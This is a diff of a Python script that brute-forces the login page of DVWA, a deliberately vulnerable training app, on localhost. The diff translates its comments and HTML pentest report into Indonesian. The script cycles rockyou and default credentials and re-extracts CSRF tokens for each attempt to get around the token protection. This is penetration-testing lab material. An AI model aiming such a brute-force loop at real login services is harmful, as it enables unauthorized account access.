@@ -7,31 +7,34 @@ import os
 
 class DVWABruteForceTester:
     def __init__(self):
+        """Inisialisasi tester brute force DVWA"""
         self.base_url = "http://localhost/dvwa"
         self.session = requests.Session()
+        # Menyimpan hasil testing untuk setiap tingkat keamanan
         self.results = {
             'low': {'success': False, 'password': '', 'attempts': 0, 'time': 0, 'username': ''},
             'medium': {'success': False, 'password': '', 'attempts': 0, 'time': 0, 'username': ''},
             'high': {'success': False, 'password': '', 'attempts': 0, 'time': 0, 'username': ''},
             'impossible': {'success': False, 'password': '', 'attempts': 0, 'time': 0, 'username': ''}
         }
-        self.usernames = []
-        self.passwords = []
-        self.load_credentials()
+        self.usernames = []  # Daftar username untuk testing
+        self.passwords = []  # Daftar password untuk testing
+        self.load_credentials()  # Memuat kredensial dari file
         
     def load_credentials(self):
-        """Load usernames and passwords from rockyou.txt"""
+        """Memuat username dan password dari file rockyou.txt"""
         try:
+            # Membuka file rockyou.txt dengan penanganan encoding yang aman
             with open('rockyou.txt', 'r', encoding='utf-8', errors='ignore') as f:
                 lines = [line.strip() for line in f.readlines() if line.strip()]
                 
-            # First 70 lines as usernames
+            # Mengambil 70 baris pertama sebagai username
             rockyou_usernames = lines[:70] if len(lines) >= 70 else lines
             
-            # First 70 lines as passwords
+            # Mengambil 70 baris pertama sebagai password
             rockyou_passwords = lines[:70] if len(lines) >= 70 else lines
             
-            # Default usernames and passwords
+            # Username dan password default sebagai fallback
             default_usernames = ['admin', 'gordonb', '1337', 'pablo', 'smithy']
             default_passwords = [
                 'password', 'admin', '123456', 'letmein', 'qwerty', 'abc123',
@@ -40,11 +43,11 @@ class DVWABruteForceTester:
                 'pass', 'hunter', 'iloveyou', 'trustno1', 'sunshine', 'football'
             ]
             
-            # Combine rockyou and default credentials
+            # Menggabungkan kredensial dari rockyou dan default
             all_usernames = rockyou_usernames + default_usernames
             all_passwords = rockyou_passwords + default_passwords
             
-            # Make unique while preserving order
+            # Membuat daftar unik sambil mempertahankan urutan
             seen_usernames = set()
             unique_usernames = []
             for user in all_usernames:
@@ -62,14 +65,15 @@ class DVWABruteForceTester:
             self.usernames = unique_usernames
             self.passwords = unique_passwords
                     
-            print(f"[+] Loaded {len(self.usernames)} unique usernames and {len(self.passwords)} unique passwords")
-            print(f"    - {len(rockyou_usernames)} from rockyou.txt as usernames")
-            print(f"    - {len(rockyou_passwords)} from rockyou.txt as passwords")
-            print(f"    - {len(default_usernames)} default usernames added")
-            print(f"    - {len(default_passwords)} default passwords added")
+            print(f"[+] Berhasil memuat {len(self.usernames)} username unik dan {len(self.passwords)} password unik")
+            print(f"    - {len(rockyou_usernames)} dari rockyou.txt sebagai username")
+            print(f"    - {len(rockyou_passwords)} dari rockyou.txt sebagai password")
+            print(f"    - {len(default_usernames)} username default ditambahkan")
+            print(f"    - {len(default_passwords)} password default ditambahkan")
             
         except FileNotFoundError:
-            print("[!] rockyou.txt not found, using default credentials")
+            # Jika file rockyou.txt tidak ditemukan, gunakan kredensial default
+            print("[!] File rockyou.txt tidak ditemukan, menggunakan kredensial default")
             self.usernames = ['admin', 'gordonb', '1337', 'pablo', 'smithy']
             self.passwords = [
                 'password', 'admin', '123456', 'letmein', 'qwerty', 'abc123',
@@ -78,7 +82,8 @@ class DVWABruteForceTester:
                 'pass', 'hunter', 'iloveyou', 'trustno1', 'sunshine', 'football'
             ]
         except Exception as e:
-            print(f"[!] Error loading rockyou.txt: {str(e)}, using default credentials")
+            # Penanganan error umum saat memuat file
+            print(f"[!] Error saat memuat rockyou.txt: {str(e)}, menggunakan kredensial default")
             self.usernames = ['admin', 'gordonb', '1337', 'pablo', 'smithy']
             self.passwords = [
                 'password', 'admin', '123456', 'letmein', 'qwerty', 'abc123',
@@ -88,15 +93,15 @@ class DVWABruteForceTester:
             ]
 
     def login_to_dvwa(self):
-        """Login to DVWA with default credentials"""
+        """Login ke DVWA dengan kredensial default"""
         login_url = f"{self.base_url}/login.php"
         try:
-            # Get login page to extract token
+            # Mendapatkan halaman login untuk mengekstrak token
             response = self.session.get(login_url)
             soup = BeautifulSoup(response.text, 'html.parser')
             token = soup.find('input', {'name': 'user_token'})['value']
             
-            # Perform login
+            # Melakukan login dengan kredensial default
             login_data = {
                 'username': 'admin',
                 'password': 'password',
@@ -106,17 +111,18 @@ class DVWABruteForceTester:
             self.session.post(login_url, data=login_data)
             return True
         except Exception as e:
-            print(f"[!] Login failed: {str(e)}")
+            print(f"[!] Login gagal: {str(e)}")
             return False
 
     def set_security_level(self, level):
-        """Set DVWA security level"""
+        """Mengatur tingkat keamanan DVWA"""
         try:
             security_url = f"{self.base_url}/security.php"
             response = self.session.get(security_url)
             soup = BeautifulSoup(response.text, 'html.parser')
             token = soup.find('input', {'name': 'user_token'})['value']
             
+            # Mengatur tingkat keamanan sesuai parameter
             security_data = {
                 'security': level,
                 'seclev_submit': 'Submit',
@@ -125,11 +131,11 @@ class DVWABruteForceTester:
             self.session.post(security_url, data=security_data)
             return True
         except Exception as e:
-            print(f"[!] Failed to set security level {level}: {str(e)}")
+            print(f"[!] Gagal mengatur tingkat keamanan {level}: {str(e)}")
             return False
 
     def get_brute_force_token(self):
-        """Extract CSRF token for brute force page"""
+        """Mengekstrak CSRF token untuk halaman brute force"""
         try:
             brute_url = f"{self.base_url}/vulnerabilities/brute/"
             response = self.session.get(brute_url)
@@ -137,11 +143,11 @@ class DVWABruteForceTester:
             token = soup.find('input', {'name': 'user_token'})['value']
             return token
         except Exception as e:
-            print(f"[!] Error getting CSRF token: {str(e)}")
+            print(f"[!] Error mendapatkan CSRF token: {str(e)}")
             return None
 
     def attempt_login(self, username, password, token=None):
-        """Attempt to login with given credentials"""
+        """Mencoba login dengan kredensial yang diberikan"""
         brute_url = f"{self.base_url}/vulnerabilities/brute/"
         data = {
             'username': username,
@@ -149,6 +155,7 @@ class DVWABruteForceTester:
             'Login': 'Login'
         }
         
+        # Menambahkan token CSRF jika tersedia
         if token:
             data['user_token'] = token
             
@@ -156,7 +163,8 @@ class DVWABruteForceTester:
         return "Welcome" in response.text or "succesfully" in response.text
 
     def is_account_locked(self, response_text):
-        """Check if account is locked based on response"""
+        """Memeriksa apakah akun terkunci berdasarkan respons"""
+        # Daftar pesan yang menunjukkan akun terkunci
         lock_messages = [
             "account has been locked",
             "too many failed login attempts",
@@ -166,18 +174,18 @@ class DVWABruteForceTester:
         return any(msg in response_text.lower() for msg in lock_messages)
 
     def test_low_level(self):
-        """Test brute force at low security level - no limits"""
-        print("[*] Testing Low Security Level (Unlimited attempts)")
+        """Testing brute force pada tingkat keamanan rendah - tanpa batas"""
+        print("[*] Testing Tingkat Keamanan Rendah (Tanpa batas percobaan)")
         self.set_security_level('low')
         
         start_time = time.time()
         attempts = 0
         
-        # No limits on low security - test all credentials
+        # Tidak ada batas pada tingkat keamanan rendah - test semua kredensial
         for username in self.usernames:
             for password in self.passwords:
                 attempts += 1
-                print(f"[*] Trying {username}:{password}")
+                print(f"[*] Mencoba {username}:{password}")
                 
                 if self.attempt_login(username, password):
                     elapsed = time.time() - start_time
@@ -188,7 +196,7 @@ class DVWABruteForceTester:
                         'time': round(elapsed, 2),
                         'username': username
                     }
-                    print(f"[+] SUCCESS: {username}:{password}")
+                    print(f"[+] BERHASIL: {username}:{password}")
                     return True
                     
         elapsed = time.time() - start_time
@@ -202,22 +210,22 @@ class DVWABruteForceTester:
         return False
 
     def test_medium_level(self):
-        """Test brute force at medium security level - limit to 10 total attempts"""
-        print("[*] Testing Medium Security Level (Limited to 10 total attempts)")
+        """Testing brute force pada tingkat keamanan sedang - batas 10 percobaan"""
+        print("[*] Testing Tingkat Keamanan Sedang (Batas 10 percobaan total)")
         self.set_security_level('medium')
         
         start_time = time.time()
         attempts = 0
         max_attempts = 10
         
-        # Create combinations and limit to 10 total attempts
+        # Membuat kombinasi dan membatasi hingga 10 percobaan total
         combinations = [(u, p) for u in self.usernames for p in self.passwords]
         
         for username, password in combinations[:max_attempts]:
             attempts += 1
-            print(f"[*] Trying {username}:{password} (Attempt {attempts}/{max_attempts})")
+            print(f"[*] Mencoba {username}:{password} (Percobaan {attempts}/{max_attempts})")
             
-            # Record start time for this attempt
+            # Mencatat waktu awal untuk percobaan ini
             attempt_start = time.time()
             
             if self.attempt_login(username, password):
@@ -229,12 +237,12 @@ class DVWABruteForceTester:
                     'time': round(elapsed, 2),
                     'username': username
                 }
-                print(f"[+] SUCCESS: {username}:{password}")
+                print(f"[+] BERHASIL: {username}:{password}")
                 return True
                 
-            # Measure actual response time from the system
+            # Mengukur waktu respons aktual dari sistem
             attempt_time = time.time() - attempt_start
-            print(f"    [-] Attempt took {attempt_time:.2f} seconds")
+            print(f"    [-] Percobaan memakan waktu {attempt_time:.2f} detik")
             
         elapsed = time.time() - start_time
         self.results['medium'] = {
@@ -247,33 +255,33 @@ class DVWABruteForceTester:
         return False
 
     def test_high_level(self):
-        """Test brute force at high security level - limit to 10 total attempts"""
-        print("[*] Testing High Security Level (Limited to 10 total attempts)")
+        """Testing brute force pada tingkat keamanan tinggi - batas 10 percobaan"""
+        print("[*] Testing Tingkat Keamanan Tinggi (Batas 10 percobaan total)")
         self.set_security_level('high')
         
         start_time = time.time()
         attempts = 0
         max_attempts = 10
         
-        # Create combinations and limit to 10 total attempts
+        # Membuat kombinasi dan membatasi hingga 10 percobaan total
         combinations = [(u, p) for u in self.usernames for p in self.passwords]
         
         for username, password in combinations[:max_attempts]:
             attempts += 1
-            print(f"[*] Trying {username}:{password} (Attempt {attempts}/{max_attempts})")
+            print(f"[*] Mencoba {username}:{password} (Percobaan {attempts}/{max_attempts})")
             
-            # Record start time for this attempt
+            # Mencatat waktu awal untuk percobaan ini
             attempt_start = time.time()
             
-            # Get CSRF token for each request - CRITICAL FIX: Must get fresh token for each attempt
+            # Mendapatkan token CSRF untuk setiap permintaan - PENTING: Harus token baru setiap kali
             token = self.get_brute_force_token()
             if not token:
-                print(f"    [!] Failed to get CSRF token")
-                # Wait a bit before retrying to avoid flooding
+                print(f"    [!] Gagal mendapatkan token CSRF")
+                # Menunggu sebentar sebelum mencoba lagi untuk menghindari flooding
                 time.sleep(1)
                 token = self.get_brute_force_token()
                 if not token:
-                    print(f"    [!] Still failed to get CSRF token, skipping")
+                    print(f"    [!] Masih gagal mendapatkan token CSRF, melewati")
                     continue
             
             if self.attempt_login(username, password, token):
@@ -285,12 +293,12 @@ class DVWABruteForceTester:
                     'time': round(elapsed, 2),
                     'username': username
                 }
-                print(f"[+] SUCCESS: {username}:{password}")
+                print(f"[+] BERHASIL: {username}:{password}")
                 return True
                 
-            # Measure actual response time from the system
+            # Mengukur waktu respons aktual dari sistem
             attempt_time = time.time() - attempt_start
-            print(f"    [-] Attempt took {attempt_time:.2f} seconds")
+            print(f"    [-] Percobaan memakan waktu {attempt_time:.2f} detik")
             
         elapsed = time.time() - start_time
         self.results['high'] = {
@@ -303,36 +311,36 @@ class DVWABruteForceTester:
         return False
 
     def test_impossible_level(self):
-        """Test brute force at impossible security level - limit to 10 total attempts"""
-        print("[*] Testing Impossible Security Level (Limited to 10 total attempts)")
+        """Testing brute force pada tingkat keamanan mustahil - batas 10 percobaan"""
+        print("[*] Testing Tingkat Keamanan Mustahil (Batas 10 percobaan total)")
         self.set_security_level('impossible')
         
         start_time = time.time()
         attempts = 0
         max_attempts = 10
         
-        # Create combinations and limit to 10 total attempts
+        # Membuat kombinasi dan membatasi hingga 10 percobaan total
         combinations = [(u, p) for u in self.usernames for p in self.passwords]
         
         for username, password in combinations[:max_attempts]:
             attempts += 1
-            print(f"[*] Trying {username}:{password} (Attempt {attempts}/{max_attempts})")
+            print(f"[*] Mencoba {username}:{password} (Percobaan {attempts}/{max_attempts})")
             
-            # Record start time for this attempt
+            # Mencatat waktu awal untuk percobaan ini
             attempt_start = time.time()
             
-            # Get CSRF token for each request - CRITICAL FIX: Must get fresh token for each attempt
+            # Mendapatkan token CSRF untuk setiap permintaan - PENTING: Harus token baru setiap kali
             token = self.get_brute_force_token()
             if not token:
-                print(f"    [!] Failed to get CSRF token")
-                # Wait a bit before retrying to avoid flooding
+                print(f"    [!] Gagal mendapatkan token CSRF")
+                # Menunggu sebentar sebelum mencoba lagi untuk menghindari flooding
                 time.sleep(1)
                 token = self.get_brute_force_token()
                 if not token:
-                    print(f"    [!] Still failed to get CSRF token, skipping")
+                    print(f"    [!] Masih gagal mendapatkan token CSRF, melewati")
                     continue
             
-            # Attempt login and check response for lockout
+            # Mencoba login dan memeriksa respons untuk kunci akun
             brute_url = f"{self.base_url}/vulnerabilities/brute/"
             data = {
                 'username': username,
@@ -345,7 +353,7 @@ class DVWABruteForceTester:
                 
             response = self.session.get(brute_url, params=data)
             
-            # Check if login was successful
+            # Memeriksa apakah login berhasil
             if "Welcome" in response.text or "succesfully" in response.text:
                 elapsed = time.time() - start_time
                 self.results['impossible'] = {
@@ -355,12 +363,12 @@ class DVWABruteForceTester:
                     'time': round(elapsed, 2),
                     'username': username
                 }
-                print(f"[+] SUCCESS: {username}:{password}")
+                print(f"[+] BERHASIL: {username}:{password}")
                 return True
                 
-            # Check if account is locked
+            # Memeriksa apakah akun terkunci
             if self.is_account_locked(response.text):
-                print(f"    [!] Account appears to be locked after {attempts} attempts")
+                print(f"    [!] Akun tampaknya terkunci setelah {attempts} percobaan")
                 elapsed = time.time() - start_time
                 self.results['impossible'] = {
                     'success': False,
@@ -372,9 +380,9 @@ class DVWABruteForceTester:
                 }
                 return False
                 
-            # Measure actual response time from the system
+            # Mengukur waktu respons aktual dari sistem
             attempt_time = time.time() - attempt_start
-            print(f"    [-] Attempt took {attempt_time:.2f} seconds")
+            print(f"    [-] Percobaan memakan waktu {attempt_time:.2f} detik")
             
         elapsed = time.time() - start_time
         self.results['impossible'] = {
@@ -388,12 +396,12 @@ class DVWABruteForceTester:
         return False
 
     def generate_html_report(self):
-        """Generate OSCP-style HTML report"""
+        """Menghasilkan laporan HTML gaya OSCP dalam bahasa Indonesia"""
         html_content = '''<!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
   <meta charset="UTF-8" />
-  <title>OSCP-Style Brute Force Assessment - DVWA</title>
+  <title>Laporan Penilaian Brute Force DVWA - Gaya OSCP</title>
   <style>
     body { 
         font-family: 'Courier New', monospace; 
@@ -469,142 +477,142 @@ class DVWABruteForceTester:
 </head>
 <body>
 
-<h1>[+] DVWA Brute Force Module Assessment</h1>
-<h3>OSCP-Style Penetration Test Report</h3>
-<div class="timestamp">Generated on: ''' + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + '''</div>
+<h1>[+] Penilaian Modul Brute Force DVWA</h1>
+<h3>Laporan Penetration Test Gaya OSCP</h3>
+<div class="timestamp">Dibuat pada: ''' + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + '''</div>
 
 <div class="section">
-  <h2>1. Executive Summary</h2>
-  <p>This report details the results of a manual and automated brute force assessment conducted against the Brute Force module of DVWA across all security levels. The testing revealed that while incremental security measures are implemented at each level, only the "Impossible" level effectively prevents brute force attacks through account lockout mechanisms.</p>
+  <h2>1. Ringkasan Eksekutif</h2>
+  <p>Laporan ini merinci hasil penilaian brute force manual dan otomatis yang dilakukan terhadap modul Brute Force DVWA di semua tingkat keamanan. Pengujian menunjukkan bahwa meskipun langkah-langkah keamanan bertahap diterapkan pada setiap tingkat, hanya tingkat "Mustahil" yang secara efektif mencegah serangan brute force melalui mekanisme kunci akun.</p>
   
-  <p><strong>Credentials Source:</strong> Usernames and passwords were loaded from rockyou.txt file in the same directory. Default credentials were appended and duplicates were removed to ensure unique values.</p>
-  <p><strong>Testing Methodology:</strong> Low security tested with unlimited attempts, other levels limited to 10 total attempts to save time. Observed actual system delays rather than imposing artificial ones.</p>
+  <p><strong>Sumber Kredensial:</strong> Username dan password dimuat dari file rockyou.txt di direktori yang sama. Kredensial default ditambahkan dan duplikat dihapus untuk memastikan nilai yang unik.</p>
+  <p><strong>Metodologi Pengujian:</strong> Tingkat keamanan rendah diuji tanpa batas, tingkat lainnya dibatasi hingga 10 percobaan total untuk menghemat waktu. Mengamati penundaan sistem aktual daripada memberlakukan penundaan buatan.</p>
 </div>
 
 <div class="section">
-  <h2>2. Methodology</h2>
+  <h2>2. Metodologi</h2>
   <p>
-    <strong>Tools Used:</strong> Custom Python script with requests and BeautifulSoup<br>
+    <strong>Alat yang Digunakan:</strong> Script Python kustom dengan requests dan BeautifulSoup<br>
     <strong>Target:</strong> <code>http://localhost/dvwa/vulnerabilities/brute/</code><br>
-    <strong>Usernames Tested:</strong> ''' + str(len(self.usernames)) + ''' unique usernames (70 from rockyou.txt + defaults)<br>
-    <strong>Password Wordlist:</strong> ''' + str(len(self.passwords)) + ''' unique passwords (70 from rockyou.txt + defaults)<br>
-    <strong>Attempts:</strong> Low security - unlimited, Others - limited to 10 total attempts<br>
-    <strong>Delay Handling:</strong> Observed actual system delays rather than imposing artificial ones<br>
-    Authentication was performed before testing each security level.
+    <strong>Username yang Diuji:</strong> ''' + str(len(self.usernames)) + ''' username unik (70 dari rockyou.txt + default)<br>
+    <strong>Daftar Password:</strong> ''' + str(len(self.passwords)) + ''' password unik (70 dari rockyou.txt + default)<br>
+    <strong>Percobaan:</strong> Tingkat rendah - tanpa batas, Lainnya - dibatasi hingga 10 percobaan total<br>
+    <strong>Penanganan Penundaan:</strong> Mengamati penundaan sistem aktual daripada memberlakukan penundaan buatan<br>
+    Autentikasi dilakukan sebelum menguji setiap tingkat keamanan.
   </p>
 </div>
 
 <div class="section">
-  <h2>3. Findings by Security Level</h2>'''
+  <h2>3. Temuan Berdasarkan Tingkat Keamanan</h2>'''
 
-        # Low Level Results
+        # Hasil Tingkat Rendah
         html_content += '''
   <div class="level-low">
-    <h3>[-] Low Level</h3>'''
+    <h3>[-] Tingkat Rendah</h3>'''
         if self.results['low']['success']:
             html_content += f'''
-    <p class="finding">Vulnerable to unlimited brute force attacks.</p>
+    <p class="finding">Rentan terhadap serangan brute force tanpa batas.</p>
     <pre>
-[+] Admin login successful!
-[+] Password found: '{self.results['low']['password']}'
+[+] Login admin berhasil!
+[+] Password ditemukan: '{self.results['low']['password']}'
 [+] Username: {self.results['low']['username']}
-[+] Total attempts: {self.results['low']['attempts']}
-[+] Time taken: {self.results['low']['time']} seconds
+[+] Total percobaan: {self.results['low']['attempts']}
+[+] Waktu yang dibutuhkan: {self.results['low']['time']} detik
     </pre>'''
         else:
             html_content += f'''
-    <p class="failure">Brute force completed without success.</p>
+    <p class="failure">Brute force selesai tanpa keberhasilan.</p>
     <pre>
-[-] No valid credentials found
-[-] Total attempts: {self.results['low']['attempts']}
-[-] Time taken: {self.results['low']['time']} seconds
+[-] Tidak ditemukan kredensial yang valid
+[-] Total percobaan: {self.results['low']['attempts']}
+[-] Waktu yang dibutuhkan: {self.results['low']['time']} detik
     </pre>'''
         html_content += '''
   </div>'''
 
-        # Medium Level Results
+        # Hasil Tingkat Sedang
         html_content += '''
   <div class="level-medium">
-    <h3>[-] Medium Level</h3>'''
+    <h3>[-] Tingkat Sedang</h3>'''
         if self.results['medium']['success']:
             html_content += f'''
-    <p class="finding">Rate-limited with system-imposed delays per failure.</p>
+    <p class="finding">Dibatasi laju dengan penundaan sistem per kegagalan.</p>
     <pre>
-[+] Success after {self.results['medium']['attempts']} attempts.
+[+] Berhasil setelah {self.results['medium']['attempts']} percobaan.
 [+] Password: '{self.results['medium']['password']}'
 [+] Username: {self.results['medium']['username']}
-[+] Time taken: {self.results['medium']['time']} seconds
-[+] Observed system delays between requests
+[+] Waktu yang dibutuhkan: {self.results['medium']['time']} detik
+[+] Mengamati penundaan sistem antar permintaan
     </pre>'''
         else:
             html_content += f'''
-    <p class="failure">Brute force completed without success.</p>
+    <p class="failure">Brute force selesai tanpa keberhasilan.</p>
     <pre>
-[-] No valid credentials found
-[-] Total attempts: {self.results['medium']['attempts']}
-[-] Time taken: {self.results['medium']['time']} seconds
-[-] Observed system-imposed delays between requests
+[-] Tidak ditemukan kredensial yang valid
+[-] Total percobaan: {self.results['medium']['attempts']}
+[-] Waktu yang dibutuhkan: {self.results['medium']['time']} detik
+[-] Mengamati penundaan sistem yang diberlakukan antar permintaan
     </pre>'''
         html_content += '''
   </div>'''
 
-        # High Level Results
+        # Hasil Tingkat Tinggi
         html_content += '''
   <div class="level-high">
-    <h3>[-] High Level</h3>'''
+    <h3>[-] Tingkat Tinggi</h3>'''
         if self.results['high']['success']:
             html_content += f'''
-    <p class="finding">CSRF token present but bypassed. System-imposed randomized delays detected.</p>
+    <p class="finding">Token CSRF tersedia tetapi dapat diatasi. Penundaan sistem yang diacak terdeteksi.</p>
     <pre>
-[+] Token extraction: SUCCESS
-[+] Delay handling: Observed system delays (2-4s)
-[+] Password found: '{self.results['high']['password']}'
+[+] Ekstraksi token berhasil!
+[+] Penanganan penundaan: Mengamati penundaan sistem (2-4s)
+[+] Password ditemukan: '{self.results['high']['password']}'
 [+] Username: {self.results['high']['username']}
-[+] Total attempts: {self.results['high']['attempts']}
-[+] Time taken: {self.results['high']['time']} seconds
+[+] Total percobaan: {self.results['high']['attempts']}
+[+] Waktu yang dibutuhkan: {self.results['high']['time']} detik
     </pre>'''
         else:
             html_content += f'''
-    <p class="failure">Brute force completed without success.</p>
+    <p class="failure">Brute force selesai tanpa keberhasilan.</p>
     <pre>
-[-] No valid credentials found
-[-] Total attempts: {self.results['high']['attempts']}
-[-] Time taken: {self.results['high']['time']} seconds
-[-] Observed system-imposed delays between requests
+[-] Tidak ditemukan kredensial yang valid
+[-] Total percobaan: {self.results['high']['attempts']}
+[-] Waktu yang dibutuhkan: {self.results['high']['time']} detik
+[-] Mengamati penundaan sistem yang diberlakukan antar permintaan
     </pre>'''
         html_content += '''
   </div>'''
 
-        # Impossible Level Results
+        # Hasil Tingkat Mustahil
         html_content += '''
   <div class="level-impossible">
-    <h3>[!] Impossible Level</h3>'''
+    <h3>[!] Tingkat Mustahil</h3>'''
         if 'locked' in self.results['impossible'] and self.results['impossible']['locked']:
             html_content += f'''
-    <p class="success">Account lockout mechanism detected!</p>
+    <p class="success">Mekanisme kunci akun terdeteksi!</p>
     <pre>
-[!] Account locked after {self.results['impossible']['attempts']} failed attempts
-[!] Protection effective against brute force
-[!] Further login attempts would be rejected
-[!] Recommendation: Add IP-based rate limiting and monitoring
+[!] Akun terkunci setelah {self.results['impossible']['attempts']} percobaan gagal
+[!] Perlindungan efektif terhadap brute force
+[!] Percobaan login lebih lanjut akan ditolak
+[!] Rekomendasi: Tambahkan pembatasan berbasis IP dan pemantauan
     </pre>'''
         elif self.results['impossible']['success']:
             html_content += f'''
-    <p class="success">Account lockout mechanism in place but bypassed!</p>
+    <p class="success">Mekanisme kunci akun tersedia tetapi dapat diatasi!</p>
     <pre>
-[+] SUCCESS: Found valid credentials before lockout
+[+] BERHASIL: Menemukan kredensial yang valid sebelum kunci
 [+] Password: '{self.results['impossible']['password']}'
 [+] Username: {self.results['impossible']['username']}
-[+] Total attempts: {self.results['impossible']['attempts']}
-[+] Time taken: {self.results['impossible']['time']} seconds
+[+] Total percobaan: {self.results['impossible']['attempts']}
+[+] Waktu yang dibutuhkan: {self.results['impossible']['time']} detik
     </pre>'''
         else:
             html_content += f'''
-    <p class="success">Account lockout mechanism in place.</p>
+    <p class="success">Mekanisme kunci akun tersedia.</p>
     <pre>
-[-] After {self.results['impossible']['attempts']} failed attempts, account would be locked
-[-] Protection effective against brute force
-[-] Recommendation: Add IP-based rate limiting and monitoring
+[-] Setelah {self.results['impossible']['attempts']} percobaan gagal, akun akan terkunci
+[-] Perlindungan efektif terhadap brute force
+[-] Rekomendasi: Tambahkan pembatasan berbasis IP dan pemantauan
     </pre>'''
         html_content += '''
   </div>'''
@@ -613,20 +621,20 @@ class DVWABruteForceTester:
 </div>
 
 <div class="section">
-  <h2>4. Detailed Results Table</h2>
+  <h2>4. Tabel Hasil Terperinci</h2>
   <table>
     <tr>
-      <th>Security Level</th>
+      <th>Tingkat Keamanan</th>
       <th>Status</th>
-      <th>Password Found</th>
-      <th>Attempts</th>
-      <th>Time (sec)</th>
+      <th>Password Ditemukan</th>
+      <th>Percobaan</th>
+      <th>Waktu (detik)</th>
     </tr>'''
         
         levels = ['low', 'medium', 'high', 'impossible']
         for level in levels:
             result = self.results[level]
-            status = "SUCCESS" if result['success'] else "FAILED"
+            status = "BERHASIL" if result['success'] else "GAGAL"
             password = result['password'] if result['password'] else "N/A"
             html_content += f'''
     <tr>
@@ -642,62 +650,62 @@ class DVWABruteForceTester:
 </div>
 
 <div class="section">
-  <h2>5. Conclusion</h2>
-  <p>The low, medium, and high security levels are vulnerable to brute force attacks despite incremental protections. Only the "Impossible" level effectively mitigates the threat through account lockout. The test demonstrates that:</p>
+  <h2>5. Kesimpulan</h2>
+  <p>Tingkat keamanan rendah, sedang, dan tinggi rentan terhadap serangan brute force meskipun perlindungan bertahap diterapkan. Hanya tingkat "Mustahil" yang secara efektif mengurangi ancaman melalui kunci akun. Pengujian menunjukkan bahwa:</p>
   <ul>
-    <li>Without any protection, brute force attacks are trivially successful</li>
-    <li>Simple delays imposed by the system are insufficient to prevent determined attackers</li>
-    <li>CSRF tokens can be bypassed by extracting them programmatically</li>
-    <li>Account lockout mechanisms provide effective protection against brute force</li>
+    <li>Tanpa perlindungan apa pun, serangan brute force sangat mudah berhasil</li>
+    <li>Penundaan sederhana yang diberlakukan oleh sistem tidak cukup untuk mencegah penyerang yang bertekun</li>
+    <li>Token CSRF dapat diatasi dengan mengekstraknya secara programatik</li>
+    <li>Mekanisme kunci akun memberikan perlindungan yang efektif terhadap brute force</li>
   </ul>
 </div>
 
 <div class="section">
-  <h2>6. Recommendations</h2>
+  <h2>6. Rekomendasi</h2>
   <ul>
-    <li>Implement multi-factor authentication (MFA) for all accounts</li>
-    <li>Use strong rate limiting and IP-based blocking after failed attempts</li>
-    <li>Enforce complex password policies and regular password changes</li>
-    <li>Monitor and alert on repeated failed login attempts</li>
-    <li>Consider implementing CAPTCHA after a threshold of failed attempts</li>
-    <li>Use account lockout with exponential backoff for additional security</li>
+    <li>Terapkan autentikasi multi-faktor (MFA) untuk semua akun</li>
+    <li>Gunakan pembatasan laju yang kuat dan pemblokiran berbasis IP setelah percobaan gagal</li>
+    <li>Terapkan kebijakan password yang kompleks dan perubahan password berkala</li>
+    <li>Pantau dan beri peringatan atas percobaan login gagal yang berulang</li>
+    <li>Pertimbangkan penerapan CAPTCHA setelah ambang batas percobaan gagal tertentu</li>
+    <li>Gunakan kunci akun dengan backoff eksponensial untuk keamanan tambahan</li>
   </ul>
 </div>
 
 <footer>
-  Generated by DVWA Brute Force Testing Script | Assessment Date: ''' + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + '''
+  Dihasilkan oleh Script Testing Brute Force DVWA | Tanggal Penilaian: ''' + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + '''
 </footer>
 
 </body>
 </html>'''
 
-        # Write to file with UTF-8 encoding to fix Unicode issues
+        # Menulis ke file dengan encoding UTF-8 untuk menghindari masalah Unicode
         with open('dvwa_brute_force_report.html', 'w', encoding='utf-8') as f:
             f.write(html_content)
         
-        print("[+] HTML report generated: dvwa_brute_force_report.html")
+        print("[+] Laporan HTML dihasilkan: dvwa_brute_force_report.html")
 
     def run_all_tests(self):
-        """Run all brute force tests"""
-        print("[*] Starting DVWA Brute Force Testing")
-        print(f"[*] Using {len(self.usernames)} unique usernames and {len(self.passwords)} unique passwords")
-        print("[*] Low security: Unlimited attempts, Others: Limited to 10 total attempts")
+        """Menjalankan semua test brute force"""
+        print("[*] Memulai Testing Brute Force DVWA")
+        print(f"[*] Menggunakan {len(self.usernames)} username unik dan {len(self.passwords)} password unik")
+        print("[*] Tingkat rendah: Tanpa batas percobaan, Lainnya: Dibatasi hingga 10 percobaan total")
         
         if not self.login_to_dvwa():
-            print("[!] Failed to login to DVWA")
+            print("[!] Gagal login ke DVWA")
             return
             
-        print("[+] Successfully logged in to DVWA")
+        print("[+] Berhasil login ke DVWA")
         
-        # Run tests in order
+        # Menjalankan test secara berurutan
         self.test_low_level()
         self.test_medium_level()
         self.test_high_level()
         self.test_impossible_level()
         
-        # Generate report
+        # Menghasilkan laporan
         self.generate_html_report()
-        print("[*] All tests completed")
+        print("[*] Semua test selesai")
 
 if __name__ == "__main__":
     tester = DVWABruteForceTester()
